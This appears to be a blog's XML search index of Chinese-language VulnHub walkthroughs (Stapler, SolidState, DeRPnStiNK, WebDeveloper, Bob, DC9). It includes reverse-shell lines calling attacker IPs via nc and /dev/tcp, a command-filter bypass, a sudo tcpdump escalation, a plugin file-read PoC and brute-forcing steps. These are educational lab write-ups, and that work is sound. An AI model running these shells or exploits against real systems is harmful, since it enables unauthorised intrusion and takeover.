<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Stapler：Nikto扫描发现关键目录</title>
      <link href="/posts/101affbe.html"/>
      <url>/posts/101affbe.html</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="https://www.vulnhub.com/entry/stapler-1,150/">靶机下载</a></p></blockquote><h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><p>nmap扫描靶机，开放了很多端口，21，53，80……</p><p><img src="/posts/101affbe/image-20230204170146106.png"></p><p>注意到139samba端口开启：</p><p><img src="/posts/101affbe/image-20230204171842823.png"></p><h3 id="Samba枚举"><a href="#Samba枚举" class="headerlink" title="Samba枚举"></a>Samba枚举</h3><pre class="line-numbers language-none"><code class="language-none">enum4linux 192.168.56.4 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现可用共享：</p><p><img src="/posts/101affbe/image-20230204172124820.png"></p><p>尝试连接kathy：</p><pre class="line-numbers language-none"><code class="language-none">smbclient -U &#39;&#39; &#x2F;&#x2F;192.168.56.4&#x2F;kathy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/101affbe/image-20230204172243709.png"></p><p>下载文件：</p><p><img src="/posts/101affbe/image-20230204172353353.png"></p><p>todo-list文件提示backup中有重要信息：</p><p><img src="/posts/101affbe/image-20230204172442169.png"></p><p>下载backup文件夹：</p><p><img src="/posts/101affbe/image-20230204172530108.png"></p><p>查看vsftpd.conf文件，发现配置中显示，ftp可以匿名登录：</p><p><img src="/posts/101affbe/image-20230206144917288.png"></p><h3 id="ftp枚举"><a href="#ftp枚举" class="headerlink" title="ftp枚举"></a>ftp枚举</h3><p>允许匿名登录，即不需要密码，所以ftp直接连接靶机：</p><p><img src="/posts/101affbe/image-20230206145142260.png"></p><p>路径下有一个note文件，下载下来：</p><p><img src="/posts/101affbe/image-20230206145521742.png"></p><p>note内容：</p><p><img src="/posts/101affbe/image-20230206145607062.png"></p><p>除了两个用户名elly和john之外，其它似乎没有用处。</p><h3 id="Nikto扫描"><a href="#Nikto扫描" class="headerlink" title="Nikto扫描"></a>Nikto扫描</h3><p>对于web服务，80端口页面不存在，12380端口出现一个网页：</p><p><img src="/posts/101affbe/image-20230206150706993.png"></p><p>用nikto对其进行扫描：</p><pre class="line-numbers language-none"><code class="language-none">nikto -host 192.168.56.4:12380<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/101affbe/image-20230206151817467.png"></p><p>扫描出了三个入口：</p><p><img src="/posts/101affbe/image-20230206152110734.png" alt="admin112233"></p><p>这里似乎是一个被利用过的反射型XSS漏洞，目前看没用。</p><p><img src="/posts/101affbe/image-20230206152223651.png" alt="blogblog"></p><p>这是一个WordPress的博客，可以枚举。</p><p><img src="/posts/101affbe/image-20230206152355234.png" alt="phpMyAdmin"></p><p>看到WordPress和phpMyAdmin的组合，之前做过蛮多这个类型的。思路一般是枚举WordPress，通过漏洞利用获取到phpMyAdmin的登录账密，然后通过查看或者修改数据表进行下一步渗透。</p><h2 id="2-WordPress枚举"><a href="#2-WordPress枚举" class="headerlink" title="2.WordPress枚举"></a>2.WordPress枚举</h2><p>因为是枚举https，所以要注意加上“disable-tls-checks”参数，不检查证书，否则会出错。</p><p>枚举用户：</p><pre class="line-numbers language-none"><code class="language-none">wpscan --url https:&#x2F;&#x2F;192.168.56.4:12380&#x2F;blogblog&#x2F; -e u --disable-tls-checks<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/101affbe/image-20230206154700256.png"></p><p>用户还蛮多，接下来爆破密码：</p><p><img src="/posts/101affbe/image-20230206155941895.png"></p><p>另外wpscan扫描出了uploads目录可用：</p><p><img src="/posts/101affbe/image-20230206160606010.png"></p><p>在这个目录的上级目录，找到了插件列表：</p><p><img src="/posts/101affbe/image-20230206160719973.png"></p><p>在<a href="https://www.exploit-db.com/">exploit-db</a>上查找这些插件是否存在漏洞。其中，插件advanced video存在未经认证的文件下载<a href="https://www.exploit-db.com/exploits/39646">漏洞</a>：</p><p>poc：</p><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;192.168.56.4:12380&#x2F;blogblog&#x2F;wp-admin&#x2F;admin-ajax.php?action&#x3D;ave_publishPost&amp;title&#x3D;random&amp;short&#x3D;1&amp;term&#x3D;1&amp;thumb&#x3D;[FILEPATH]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>先测试一下，随便输入文件路径：</p><p><img src="/posts/101affbe/image-20230206171024820.png"></p><p>根据返回可以看出这个插件调用了一个函数获取文件内容，并生成一个访问链接。</p><p>对于WordPress，我们首先感兴趣的就是它的配置文件，它一般是WordPress目录下的wp-config.php. 在这里，完整目录&#x2F;var&#x2F;www&#x2F;https&#x2F;blogblog&#x2F;wp-config.php</p><p><img src="/posts/101affbe/image-20230206171533602.png"></p><p>把链接里的“&#x3D;”换成“-”，访问：</p><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;192.168.56.4:12380&#x2F;blogblog&#x2F;?p-250<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/101affbe/image-20230206172730776.png"></p><p>发现多了两个图片文件，把它下载下来：</p><p><img src="/posts/101affbe/image-20230206172854089.png"></p><p>虽然标注是图片文件，但是打开看其实就是WordPress的配置文件。配置文件中发现数据库的账密信息：</p><p><img src="/posts/101affbe/image-20230206173229245.png"></p><h2 id="3-反弹shell"><a href="#3-反弹shell" class="headerlink" title="3.反弹shell"></a>3.反弹shell</h2><p>用账密root:plbkac登录数据库，查看WordPress用户表：</p><p><img src="/posts/101affbe/image-20230206174528153.png"></p><p>John是管理员。因为之前破解出了一些用户的密码，比如garry的密码是football，用garry的密码hash替换john的。然后用john:football登录成功。</p><p><img src="/posts/101affbe/image-20230206174830068.png"></p><p>进入管理员页面后，可以添加插件，上传php反弹shell。</p><p><img src="/posts/101affbe/image-20230206182322934.png"></p><p>然后在uploads目录可以找到上传的shell.php</p><p><img src="/posts/101affbe/image-20230206182417241.png"></p><p>点击shell.php，触发反弹连接：</p><p><img src="/posts/101affbe/image-20230206182453641.png"></p><h2 id="4-提权"><a href="#4-提权" class="headerlink" title="4.提权"></a>4.提权</h2><p>找到JKanode用户的bash_history文件，发现了ssh连接密码：</p><p><img src="/posts/101affbe/image-20230206182921444.png"></p><p>两个用户，JKanode和peter。</p><p>当登录peter后，发现该用户有sudo权限，可提权至root。</p><p><img src="/posts/101affbe/image-20230206183158502.png"></p><p>进入&#x2F;root目录，获取到flag。</p><p><img src="/posts/101affbe/image-20230206183420821.png"></p><h2 id="5-总结"><a href="#5-总结" class="headerlink" title="5.总结"></a>5.总结</h2><p>该靶机有很多接入和提权方式，例如这篇<a href="https://joenibe.github.io/vulnhub/stapler/">walkthrough</a>是利用信息收集来的用户名进行密码的暴力破解。而且由于开放的端口多，留的兔子洞也挺多的，比如这次的ftp、DNS等和pwn掉靶机关系不大。</p><p>这次的收获主要是找到https的WordPress目录和漏洞利用。</p><p>另外，Nikto扫描要记得使用，因为如果是https的，只用dirb扫描http是扫不出来目标目录的。</p>]]></content>
      
      
      <categories>
          
          <category> walkthrough </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SolidState：James Mail Server 默认弱口令及POP3命令</title>
      <link href="/posts/85da3d86.html"/>
      <url>/posts/85da3d86.html</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="https://www.vulnhub.com/entry/solidstate-1,261/">靶机下载地址</a> </p></blockquote><h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><p>靶机ip：192.168.71.137</p><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/posts/85da3d86/image-20221218191052481.png"></p><p>有开放一些不常见的端口。</p><h3 id="Web枚举"><a href="#Web枚举" class="headerlink" title="Web枚举"></a>Web枚举</h3><p><img src="/posts/85da3d86/image-20230127214224045.png"></p><p>这里找到了一个邮箱，用户名为webadmin,可能后面会有用。</p><p><img src="/posts/85da3d86/image-20230127220232532.png"></p><p>查看源码和目录扫描没有查出新的东西。</p><h2 id="2-James-Web管理服务默认弱口令"><a href="#2-James-Web管理服务默认弱口令" class="headerlink" title="2.James Web管理服务默认弱口令"></a>2.James Web管理服务默认弱口令</h2><p>连接4555端口，看到这里是JAMES远程管理工具，需要用户名和密码登录。</p><p>JAMES看上去是一个人名，所以我一开始以为这是设置的主机名而已，但查资料后才发现这是一个名为<a href="https://james.apache.org/index.html">JAMES的Web邮件代理服务器</a>。它的默认口令为root:root。</p><p><img src="/posts/85da3d86/image-20230127223610018.png" alt="登录成功"></p><p>然后输入“HELP”查看可用命令，然后输入“listusers”显示全部账号：</p><p><img src="/posts/85da3d86/image-20230127224101218.png" alt="image-20230127224101218"></p><p>由于是用root登录，拥有最高权限，可以用“setpassword”命令重置用户的密码。</p><h2 id="3-POP3邮件泄露账密"><a href="#3-POP3邮件泄露账密" class="headerlink" title="3.POP3邮件泄露账密"></a>3.POP3邮件泄露账密</h2><p>重置全部用户名和密码后，利用修改后的账号连接110端口，查看pop3邮件内容。</p><p><img src="/posts/85da3d86/image-20230127231016830.png" alt="POP3 命令"></p><p>在mindy邮箱中发现了两封邮件，在第二封中发现了账密信息：</p><p><img src="/posts/85da3d86/image-20230127230530366.png"></p><p>用mindy:P@55W0rd1!2@登录ssh。</p><p><img src="/posts/85da3d86/image-20230127230732242.png"></p><h2 id="4-pspy提权"><a href="#4-pspy提权" class="headerlink" title="4.pspy提权"></a>4.pspy提权</h2><p><img src="/posts/85da3d86/image-20230127231228509.png"></p><p><strong>这里出现一个不常见的shell类型：rbash，它不允许执行id命令。</strong></p><p>可以通过在ssh连接命令后加’sh’来绕过：</p><pre class="line-numbers language-none"><code class="language-none">ssh mindy@192.168.71.137 sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>再转成bash终端：</p><pre class="line-numbers language-none"><code class="language-none">python3 -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在当前路径下找到user flag：</p><p><img src="/posts/85da3d86/image-20230127232919972.png"></p><p>利用<a href="https://github.com/DominicBreuker/pspy">pspy</a>对进程进行监控，将pspy上传至靶机：</p><p><img src="/posts/85da3d86/image-20230127234716819.png"></p><p>执行pspy：</p><pre class="line-numbers language-none"><code class="language-none">chmod +x pspy &amp;&amp; .&#x2F;pspy -p -i 1000<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>-p：启用输出命令到标准输出（默认启用）<br>-f：启用将文件系统事件打印到STDOUT（默认禁用）<br>-i：两次扫描procfs的时间间隔（单位：毫秒）</p><p><img src="/posts/85da3d86/image-20230127234919789.png"></p><p>tmp.py脚本定期执行，删除&#x2F;tmp文件夹内的文件：</p><p><img src="/posts/85da3d86/image-20230127235205053.png"></p><p>编辑这个脚本：</p><pre class="line-numbers language-none"><code class="language-none">echo &quot;import osos.system(&#39;nc 192.168.71.129 4444 -e &#x2F;bin&#x2F;sh&#39;)&quot; &gt; &#x2F;opt&#x2F;tmp.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/posts/85da3d86/image-20230127235814500.png"></p><p>成功获取root反弹shell，得到root权限flag。</p><h2 id="5-总结"><a href="#5-总结" class="headerlink" title="5.总结"></a>5.总结</h2><p>通过本靶机接触了一个新的应用：James，该应用存在默认弱口令。</p><p>其他考察的点包括：</p><ul><li>POP3的命令；</li><li>rbash类型的shell转换为bash；</li><li>pspy提权。</li></ul>]]></content>
      
      
      <categories>
          
          <category> walkthrough </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DeRPnStiNK：一个很典型的靶机,但需要4个flag</title>
      <link href="/posts/22faad2.html"/>
      <url>/posts/22faad2.html</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="https://www.vulnhub.com/entry/derpnstink-1,221/">靶机下载地址</a></p></blockquote><h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/posts/22faad2/image-20230118113733821.png"></p><p><img src="/posts/22faad2/image-20230119112913965.png"></p><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p><img src="/posts/22faad2/image-20230118115242476.png"></p><p>访问weblog目录：</p><p><img src="/posts/22faad2/image-20230118115023364.png"></p><p>查看源码链接，结合目录扫描中发现的info.txt中的提示，需要编辑hosts中加入域名：</p><p><img src="/posts/22faad2/image-20230118115158922.png"></p><p><img src="/posts/22faad2/image-20230118114940158.png"></p><p><img src="/posts/22faad2/image-20230118114909651.png"></p><p>加入域名后再次访问weblog：</p><p><img src="/posts/22faad2/image-20230118120427064.png"></p><h3 id="wpscan扫描"><a href="#wpscan扫描" class="headerlink" title="wpscan扫描"></a>wpscan扫描</h3><p>可以看到这也是一个WordPress应用，用wpscan扫描：</p><pre class="line-numbers language-none"><code class="language-none">wpscan --url http:&#x2F;&#x2F;derpnstink.local&#x2F;weblog&#x2F; -e u<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/22faad2/image-20230118141130899.png"></p><p>枚举到admin用户，再次爆破admin用户的密码也为admin。</p><pre class="line-numbers language-none"><code class="language-none">wpscan --url http:&#x2F;&#x2F;derpnstink.local&#x2F;weblog&#x2F; --passwords &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;metasploit&#x2F;unix_passwords.txt --usernames admin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/22faad2/image-20230118162652656.png"></p><h2 id="2-WordPress插件漏洞利用"><a href="#2-WordPress插件漏洞利用" class="headerlink" title="2.WordPress插件漏洞利用"></a>2.WordPress插件漏洞利用</h2><p>登录WordPress：</p><p><img src="/posts/22faad2/image-20230118174225230.png"></p><p>查看在weblog主页源码中看到了一些奇怪的链接，再结合WordPress中的插件设置，可知这是上传的插件内容的链接。</p><p><img src="/posts/22faad2/image-20230118175002011.png"></p><p><img src="/posts/22faad2/image-20230118175110555.png"></p><p>虽然插件是用于上传图片的，但是没有对文件类型进行检查，所以上传php反弹shell，并在kali监听端口：</p><p><img src="/posts/22faad2/image-20230118174929572.png"></p><p><img src="/posts/22faad2/image-20230118180123412.png"></p><p>访问<a href="http://derpnstink.local/weblog/wp-content/uploads/slideshow-gallery/shell.php">http://derpnstink.local/weblog/wp-content/uploads/slideshow-gallery/shell.php</a> ，反弹连接成功！</p><p><img src="/posts/22faad2/image-20230118180211390.png"></p><h2 id="3-提权"><a href="#3-提权" class="headerlink" title="3.提权"></a>3.提权</h2><p>当前用户权限为www-data:</p><p><img src="/posts/22faad2/image-20230118180511157.png"></p><p>查看WordPress配置文件：</p><p><img src="/posts/22faad2/image-20230119095833591.png"></p><p>发现mysql的用户名和密码：</p><p><img src="/posts/22faad2/image-20230119095754292.png"></p><p>用root:mysql登录系统：</p><p><img src="/posts/22faad2/image-20230119101014194.png"></p><p>查看WordPress数据库的wp_users表:</p><p><img src="/posts/22faad2/image-20230119101212807.png"></p><p>在wp_users表中，找到用户和密码。我们已经知道admin的密码是admin，那把admin用户的hash值替换到unclestinky用户。</p><p><img src="/posts/22faad2/image-20230119101428234.png"></p><h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>然后用unclestinky:admin登录WordPress，找到一个flag，这个是<strong>flag2</strong>：</p><p><img src="/posts/22faad2/image-20230119101616730.png"></p><p>继续查看数据库mysql库中的user表：</p><p><img src="/posts/22faad2/image-20230119102821365.png"></p><p>这里hash值没有加salt，比较容易破解，用<a href="https://crackstation.net/">hash工具</a>进行破解密码为wedgie57。</p><p><img src="/posts/22faad2/image-20230119103343647.png"></p><p>那么靶机用户stinky的密码可能就是wedgie57。经测试，登录stinky用户成功：</p><p><img src="/posts/22faad2/image-20230119112135375.png"></p><h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><p>得到第三个flag文件：</p><p><img src="/posts/22faad2/image-20230119112342830.png"></p><p>在ftp文件夹中找到一个有意思的文件：</p><p><img src="/posts/22faad2/image-20230119110956863.png"></p><p>要登录mrderp用户，需要找到这个嗅探文件。</p><p>找到这个嗅探文件在doucuments目录中，把它下载下来：</p><p><img src="/posts/22faad2/image-20230119113224931.png"></p><p>分析pcap包，发现mrderp用户的登录密码derpderpderpderpderpderpderp。</p><p><img src="/posts/22faad2/image-20230119114121436.png"></p><p>登录mrderp用户，查看sudo列表：</p><p><img src="/posts/22faad2/image-20230119120307220.png"></p><h3 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h3><p>创建derpy.sh文件，并执行提升到root权限，并得到flag4.</p><p><img src="/posts/22faad2/0NWroh-fx78rO5z6u.png"></p><h3 id="flag4-1"><a href="#flag4-1" class="headerlink" title="flag4"></a>flag4</h3><p>还差一个flag1，这个flag1在一个开始的网页，审查元素里面一个包裹得很深的标签中：</p><p><img src="/posts/22faad2/image-20230119112742713.png"></p><h2 id="4-总结"><a href="#4-总结" class="headerlink" title="4.总结"></a>4.总结</h2><p>这是一个很典型的oscp简单级别靶机，但是很有趣，要在各种地方找到隐藏的flag。</p>]]></content>
      
      
      <categories>
          
          <category> walkthrough </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WebDeveloper：WordPress编辑插件获取反弹shell</title>
      <link href="/posts/93a7bd5d.html"/>
      <url>/posts/93a7bd5d.html</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="https://www.vulnhub.com/entry/web-developer-1,288/">靶机下载地址</a></p></blockquote><h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/posts/93a7bd5d/image-20230113145830205.png"></p><p>从nmap扫描结果可以看出，80端口是一个WordPress应用，版本是4.9.8.</p><p><img src="/posts/93a7bd5d/image-20230113150029272.png"></p><p>用wpsan扫描靶机，枚举用户：</p><pre class="line-numbers language-none"><code class="language-none">wpscan --url http:&#x2F;&#x2F;192.168.71.159 -e u<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/93a7bd5d/image-20230113150758037.png"></p><p>扫描到了用户webdeveloper，暴力破解密码，但是并没有成功。</p><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p>没有其他方法了，尝试web枚举必备手段之一的目录扫描吧（可以和字典密码爆破同时进行）：</p><pre class="line-numbers language-none"><code class="language-none">dirb http:&#x2F;&#x2F;192.168.71.159<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/93a7bd5d/image-20230113153956390.png"></p><p>访问<a href="http://192.168.71.159/ipdata/">http://192.168.71.159/ipdata/</a></p><p><img src="/posts/93a7bd5d/image-20230113154037902.png"></p><h3 id="Wirshark分析数据获得密码"><a href="#Wirshark分析数据获得密码" class="headerlink" title="Wirshark分析数据获得密码"></a>Wirshark分析数据获得密码</h3><p>下载cap文件，然后用wireshark打开。打开这个包之后，发现应该是抓的是用户的登录过程，密码是通过post提交的，所以查找post包，看能不能发现密码信息。</p><p>在wireshark过滤器的地方输入：</p><pre class="line-numbers language-none"><code class="language-none">http.request.method&#x3D;&#x3D;&quot;POST&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/93a7bd5d/image-20230113155038011.png"></p><p>在第一个post包提交的表单中，发现了密码信息：</p><p><img src="/posts/93a7bd5d/image-20230113155211943.png"></p><p>因此获得账密：webdeveloper&#x2F;Te5eQg&amp;4sBS!Yr$)wf%(DcAd</p><h2 id="2-编辑插件获得反弹shell"><a href="#2-编辑插件获得反弹shell" class="headerlink" title="2.编辑插件获得反弹shell"></a>2.编辑插件获得反弹shell</h2><p>用账密登录WordPress，登录成功。</p><p><img src="/posts/93a7bd5d/image-20230113155644341.png"></p><p>首先枚举插件漏洞，查看安装了哪些插件：</p><p><img src="/posts/93a7bd5d/image-20230113155807651.png"></p><p>这两个插件没有查到存在漏洞。</p><p>利用编辑插件的功能，编辑<strong>akismet.php</strong>文件，插入php reverse shell代码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/bin/bash -c 'bash -i >&amp; /dev/tcp/192.168.71.139/4444 0>&amp;1'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在kali中监听端口：</p><pre class="line-numbers language-none"><code class="language-none">nc -lnvp 4444 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>点击激活插件按钮，获得反弹shell。</p><p><img src="/posts/93a7bd5d/image-20230113163701732.png"></p><p><img src="/posts/93a7bd5d/image-20230113163729411.png"></p><h2 id="3-提权"><a href="#3-提权" class="headerlink" title="3.提权"></a>3.提权</h2><p>查看WordPress的配置文件wp-config.php</p><p><img src="/posts/93a7bd5d/image-20230113164136428.png"></p><p>发现了webdeveloper的密码MasterOfTheUniverse.</p><p>用ssh连接成功，登录到webdeveloper用户：</p><p><img src="/posts/93a7bd5d/image-20230113164609531.png"></p><p>可利用tcpdump程序提权：</p><p><img src="/posts/93a7bd5d/image-20230113164717212.png"></p><p>sudo-tcpdump提权法：</p><p><strong>1）编写反弹shell脚本</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#shell.sh</span><span class="token function">mknod</span> backpipe p <span class="token operator">&amp;&amp;</span> <span class="token function">nc</span> <span class="token number">192.168</span>.71.139 <span class="token number">5555</span> <span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>backpipe <span class="token operator">|</span> /bin/bash <span class="token operator"><span class="token file-descriptor important">1</span>></span>backpipe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>将shell.sh赋予执行权限。</p><p><strong>2）在kali中监听端口</strong></p><pre class="line-numbers language-none"><code class="language-none">nc -lnvp 5555<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>3）利用tcpdump -z 参数执行脚本</strong></p><pre class="line-numbers language-none"><code class="language-none">sudo tcpdump -ln -i eth0 -w &#x2F;dev&#x2F;null -W 1 -G 1 -z .&#x2F;shell.sh -Z root<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/93a7bd5d/image-20230113165601943.png"></p><p>获取到root权限的反弹shell。</p><p><img src="/posts/93a7bd5d/image-20230113165733529.png"></p><p>获取到flag。</p><p><img src="/posts/93a7bd5d/image-20230113170027398.png"></p><h2 id="4-总结"><a href="#4-总结" class="headerlink" title="4.总结"></a>4.总结</h2><p>WordPress靶机经验总结：</p><ul><li>wpscan爆破密码和普通web枚举并行，节省时间；</li><li>已安装插件无漏洞时可以编辑插件，植入反弹shell；</li><li>进入系统首先查看WordPress的配置文件；</li><li>某个应用可以sudo提权时，直接google方法，比如遇到过的nmap、tcpdump。</li></ul>]]></content>
      
      
      <categories>
          
          <category> walkthrough </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bob：Linux命令基础绕过防护及gpg加密文件</title>
      <link href="/posts/a030ba65.html"/>
      <url>/posts/a030ba65.html</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="https://www.vulnhub.com/entry/bob-101,226/">靶机下载地址</a></p></blockquote><h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><p>端口扫描：</p><p><img src="/posts/a030ba65/image-20221218191415604.png"></p><p>web枚举：</p><p><img src="/posts/a030ba65/image-20221218192207718.png"></p><p>nmap扫描到robots.txt文件，查看文件内容：</p><p><img src="/posts/a030ba65/image-20221218192355680.png"></p><p>依次查看网页，除了login.php无法访问，其他页面如下：</p><p><img src="/posts/a030ba65/image-20221218193434535.png" alt="passwords.html"></p><p><img src="/posts/a030ba65/image-20221218193824923.png" alt="lat_memo.html"></p><p><img src="/posts/a030ba65/image-20221218193909031.png" alt="dev-shell.php"></p><h2 id="2-绕过过滤获取反弹shell"><a href="#2-绕过过滤获取反弹shell" class="headerlink" title="2.绕过过滤获取反弹shell"></a>2.绕过过滤获取反弹shell</h2><p>重点看一下这个dev_shell，它把很多命令都过滤了，比如nc，ls等。</p><p><img src="/posts/a030ba65/image-20230109212243919.png" alt="输入ls被过滤"></p><p>但是经过测试，如果先输入未过滤命令，再加上&amp;&amp;，后面的命令就没有被过滤，可以被执行。</p><p><img src="/posts/a030ba65/image-20230109212453936.png" alt="输入whoami &amp;&amp; ls"></p><p>利用nc反弹shell：</p><pre class="line-numbers language-none"><code class="language-none">echo &amp;&amp; nc 192.168.71.129 4444 -e &#x2F;bin&#x2F;bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/a030ba65/image-20230109212849956.png" alt="获取到反弹连接"></p><h2 id="3-提权"><a href="#3-提权" class="headerlink" title="3.提权"></a>3.提权</h2><p>当前权限为www-data用户。</p><p>进入&#x2F;home文件夹查看各个用户的目录：</p><p><img src="/posts/a030ba65/image-20230109213525540.png"></p><p>在bob的目录下发现.old_passwordfile.html文件，发现jc和seb用户的密码。</p><p>jc:Qwerty<br>seb:T1tanium_Pa$$word_Hack3rs_Fear_M3</p><p><img src="/posts/a030ba65/image-20230109213322585.png"></p><p>继续查看bob文件夹，发现了一个文档：</p><p><img src="/posts/a030ba65/image-20230109215041958.png"></p><p>此外，在bob目录下还有一个gpg文件，gpg是linux下的加密文件格式，需要密钥才能解密文件。</p><p><img src="/posts/a030ba65/image-20230109215522141.png"></p><p>后来发现文件的密钥是notes.sh文件内容的藏头，即<strong>HARPOCRATES</strong>，它是希腊的神的名字。&#x3D; &#x3D;！这尼玛对东方人不懂希腊神话的不友好啊。</p><p>用以下命令解密文件：</p><pre class="line-numbers language-none"><code class="language-none">gpg --batch --passphrase HARPOCRATES -d login.txt.gpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>解密出了bob用户的账密信息bob:b0bcat_</p><p><img src="/posts/a030ba65/image-20230109220545070.png"></p><p>登录bob账号，查看权限列表：</p><p><img src="/posts/a030ba65/image-20230109220726298.png"></p><p>bob拥有全部的执行权限，那就好办了，直接sudo su：</p><p><img src="/posts/a030ba65/image-20230109220904499.png"></p><p>然后在&#x2F;目录下找到flag</p><p><img src="/posts/a030ba65/image-20230109221232949.png"></p><h2 id="4-总结"><a href="#4-总结" class="headerlink" title="4.总结"></a>4.总结</h2><p>这个靶机的风格和以前做的还是挺不一样的，感觉有很多类似社工的文件给出，也有一些迷惑项，比如它给出了很多用户，甚至给了这些用户的密码，但是并没有卵用。还有一些看似有用实则没用的文件，最后证明只有bob用户的那个加密文件才能真正提权，所以本文里省略了登录其他用户账户分析的过程。</p><p>主要考察以下知识点：</p><ul><li>linux命令基础——绕过命令过滤；</li><li>gpg文件解密；</li><li>观察猜测密码的耐心。</li></ul>]]></content>
      
      
      <categories>
          
          <category> walkthrough </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC9：利用LFI漏洞枚举过滤端口的配置文件及passwd文件提权</title>
      <link href="/posts/c574ee4.html"/>
      <url>/posts/c574ee4.html</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="https://www.vulnhub.com/entry/dc-9,412/">靶机下载地址</a></p></blockquote><h2 id="1-表单SQL注入漏洞"><a href="#1-表单SQL注入漏洞" class="headerlink" title="1.表单SQL注入漏洞"></a>1.表单SQL注入漏洞</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/posts/c574ee4/image-20230106142410251.png"></p><p>注意看，22端口状态是“filtered”，这说明存在“防火墙”将端口过滤。</p><h3 id="web枚举"><a href="#web枚举" class="headerlink" title="web枚举"></a>web枚举</h3><p>在枚举过程中，其它方面没有发现可推进的攻击面，在search页面有一个提交表单，在这里可以测试是否存在sql注入攻击。</p><p>这里有一个手动测试的<a href="https://arz101.medium.com/vulnhub-dc-9-1db15e8b878e">walkthrough</a>可供参考。</p><p><img src="/posts/c574ee4/image-20230112091905257.png"></p><h3 id="Sqlmap"><a href="#Sqlmap" class="headerlink" title="Sqlmap"></a>Sqlmap</h3><p>用sqlmap会简便很多，首先用burpsuite抓取表单数据，并复制存储为search.txt.</p><p><img src="/posts/c574ee4/image-20230112092704235.png"></p><p>然后利用sqlmap查看提交表单是否存在sql注入漏洞：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap <span class="token parameter variable">-r</span> search.txt <span class="token parameter variable">--dbs</span> <span class="token parameter variable">--batch</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img 